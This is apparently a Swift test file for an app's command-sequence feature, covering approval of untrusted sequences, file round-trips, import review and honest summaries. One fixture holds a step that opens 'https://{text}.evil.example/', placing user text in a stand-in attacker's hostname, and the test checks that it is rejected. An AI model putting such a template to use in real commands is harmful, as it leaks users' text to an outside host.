import Foundation
import Testing

@testable import Apropos

@MainActor
@Suite("Sequences as commands")
struct SequenceCommandTests {
    private let steps = [Seq.upper(output: "shout"), Seq.send("dest:notes", from: .output("shout"))]

    private func sequence(trust: SequenceTrust = .trusted) -> CommandSequence {
        CommandSequence(
            title: "Shout and note", aliases: ["shoutnote"], symbol: "megaphone", steps: steps, trust: trust)
    }

    @Test func aSequenceBecomesAnOrdinaryCommandAndBack() {
        let command = sequence().userCommand(needsConfirmation: true)
        #expect(command.id == sequence().id || command.id.rawValue.hasPrefix("user:"))
        #expect(command.title == "Shout and note" && command.symbol == "megaphone" && command.aliases == ["shoutnote"])
        #expect(command.requires == [.selectedText])
        #expect(command.needsConfirmation && command.output == .none && command.review == .approved)
        #expect(command.subtitle == "2 steps")
        #expect(command.apps == .anyApp)
        let again = CommandSequence(command: command)
        #expect(again?.steps == sequence().steps)
        #expect(again?.title == "Shout and note")
        #expect(CommandSequence(command: shoutCommand()) == nil)
    }

    @Test func theCommandIsOfferedOnlyWhereItsFirstInputExists() {
        let command = sequence().userCommand()
        #expect(command.action.applies(to: textValues("x"), bundleID: "any.app"))
        #expect(!command.action.applies(to: ContextValues(), bundleID: "any.app"))
        let free = CommandSequence(title: "Links", steps: [Seq.link("https://example.com", kinds: [])]).userCommand()
        #expect(free.requires.isEmpty && free.action.applies(to: ContextValues(), bundleID: nil))
    }

    @Test func menuStepsDoNotNarrowTheCommandToTheirApp() {
        let command = CommandSequence(title: "Mixed", steps: [Seq.upper(output: "a"), Seq.menu()]).userCommand()
        #expect(command.apps == .anyApp)
    }

    @Test func untrustedSequencesAreStoredPendingAndNeverListed() throws {
        let store = UserCommandStore(directory: tempCommandsDirectory())
        let made = try store.create(sequence(trust: .untrusted).userCommand())
        #expect(made.review == .pending)
        #expect(store.runnable.isEmpty && store.pending.count == 1)
        let center = ContextActionCenter()
        center.setUserCommands(store.commands)
        #expect(center.commands.isEmpty)
        try store.approve(made.id)
        center.setUserCommands(store.commands)
        #expect(store.runnable.count == 1)
    }

    @Test func anUntrustedStepInsideATrustedSequenceMakesTheCommandPending() {
        var mixed = steps
        mixed[1].trust = .untrusted
        let command = CommandSequence(title: "Mixed", steps: mixed).userCommand()
        #expect(command.review == .pending)
        // The marks are not stored: the command's review is the one source of truth.
        #expect(command.sequenceBackend?.steps.allSatisfy { $0.trust == .trusted } == true)
    }

    @Test func approvingAPendingSequenceLetsItRun() async throws {
        let rig = SequenceRig()
        let store = UserCommandStore(directory: tempCommandsDirectory())
        let made = try store.create(sequence(trust: .untrusted).userCommand())
        let approved = try store.approve(made.id)
        let result = await rig.engine.run(approved.action, values: textValues("go"), target: nil, confirmed: true)
        #expect(throws: Never.self) { try result.get() }
        #expect(rig.sends.processes.count == 1)
    }

    @Test func aSequenceSurvivesTheCommandFileRoundTrip() throws {
        let directory = tempCommandsDirectory()
        let store = UserCommandStore(directory: directory)
        let made = try store.create(
            sequence().userCommand(
                hotkey: HotKeyCombo(keyCode: 1, modifiers: [.control, .option]), needsConfirmation: true))
        let file = directory.appendingPathComponent(String(made.id.rawValue.dropFirst(5)) + ".json")
        let text = try String(contentsOf: file, encoding: .utf8)
        #expect(text.contains("\"type\" : \"sequence\"") && text.contains("\"kind\" : \"destination\""))
        #expect(text.contains("dest:notes") && text.contains("\"output\""))

        let reloaded = UserCommandStore(directory: directory)
        #expect(reloaded.issues.isEmpty)
        #expect(reloaded.commands == [made])
        #expect(reloaded.commands.first.flatMap(CommandSequence.init(command:))?.steps == sequence().steps)
    }

    @Test func aFileWithABrokenSequenceIsSkippedAndReported() throws {
        let directory = tempCommandsDirectory()
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        let json = """
            {"schemaVersion":1,"command":{"id":"user:bad","title":"Bad","symbol":"star","requires":[],
             "backend":{"type":"sequence","sequence":{"version":1,"steps":[
               {"kind":"openURL","url":"https://{text}.evil.example/","inputs":[{"kind":"text"}]}]}},"output":"none"}}
            """
        try Data(json.utf8).write(to: directory.appendingPathComponent("bad.json"))
        let store = UserCommandStore(directory: directory)
        #expect(store.commands.isEmpty)
        #expect(store.issues.count == 1 && store.issues[0].reason.contains("Step 1"))
    }

    @Test func editingASequenceKeepsItsIdentityAndHistory() throws {
        let store = UserCommandStore(directory: tempCommandsDirectory())
        let made = try store.create(sequence().userCommand())
        var edited = try #require(CommandSequence(command: made))
        edited.steps.append(Seq.link("https://example.com/?q={text}"))
        var command = edited.userCommand()
        command.review = .approved
        let updated = try store.update(command)
        #expect(updated.id == made.id)
        #expect(updated.sequenceBackend?.steps.count == 3)
        #expect(store.history(of: made.id).count == 1)
    }

    @Test func anImportedSequenceWaitsForApprovalAndLosesItsOriginalIds() throws {
        let command = sequence().userCommand(needsConfirmation: true)
        let data = try CommandExchange.export([command], name: "Pack")
        let review = try CommandExchange.review(data, existing: [])
        let item = try #require(review.items.first)
        #expect(item.risks.contains(.runsSequence) && item.needsApproval)
        #expect(item.summary.contains { $0.hasPrefix("Runs 2 steps in order") })

        let store = UserCommandStore(directory: tempCommandsDirectory())
        let result = store.importReviewed(review)
        let stored = try #require(result.added.first)
        #expect(stored.review == .pending)
        #expect(stored.id != command.id)
        #expect(store.runnable.isEmpty)
    }

    @Test func theSummaryReadsFromDataNotFromLabels() {
        var step = Seq.send("dest:notes")
        step.label = "Totally harmless, trust me"
        step.output = nil
        let command = CommandSequence(title: "x", steps: [Seq.upper(output: "a"), step]).userCommand()
        let lines = CommandSummary.lines(for: command)
        #expect(lines.contains { $0.contains("dest:notes") })
        #expect(!lines.joined().contains("trust me"))
        #expect(lines.contains { $0.contains("gives its text to the next steps") })
    }

    @Test func sequenceStepsCanBeAskedAtRunTimeThroughTheExecution() async throws {
        let rig = SequenceRig()
        let step = SequenceStep(
            kind: .openURL(Seq.tpl("https://example.com/?q={text}")),
            inputs: [SequenceInput(.text, from: .ask(prompt: "Search for?"))])
        let command = CommandSequence(title: "Ask", steps: [step]).userCommand()
        // Without anyone to ask (a shortcut key, a link) it says so and does nothing.
        let silent = await rig.engine.run(command.action, values: ContextValues(), target: nil, confirmed: true)
        #expect(silent == .failure(.unavailable("That sequence has a question to answer first.")))
        #expect(rig.actions.opened.isEmpty)
    }
}

@MainActor
@Suite("Sequence documentation")
struct SequenceDocumentationTests {
    /// The example command in docs/sequences.md loads exactly as written, so the doc cannot drift from the format.
    @Test func theExampleInTheDocumentLoads() throws {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("docs/sequences.md")
        let text = try String(contentsOf: url, encoding: .utf8)
        let blocks = text.components(separatedBy: "```json\n").dropFirst().compactMap {
            $0.components(separatedBy: "\n```").first
        }
        let block = try #require(blocks.first { $0.contains("\"type\": \"sequence\"") })
        let command = try UserCommandStore.decode(Data(block.utf8), functions: .builtin)
        #expect(command.title == "Shout and note" && command.aliases == ["shout"])
        let backend = try #require(command.sequenceBackend)
        #expect(backend.steps.count == 2)
        let plan = SequencePlanner.plan(backend, catalogue: bundledCatalogue())
        #expect(plan.isRunnable && !plan.requiresConfirmation)
        #expect(command.requires == [.selectedText] && command.timeout == backend.suggestedTimeout)
    }
}
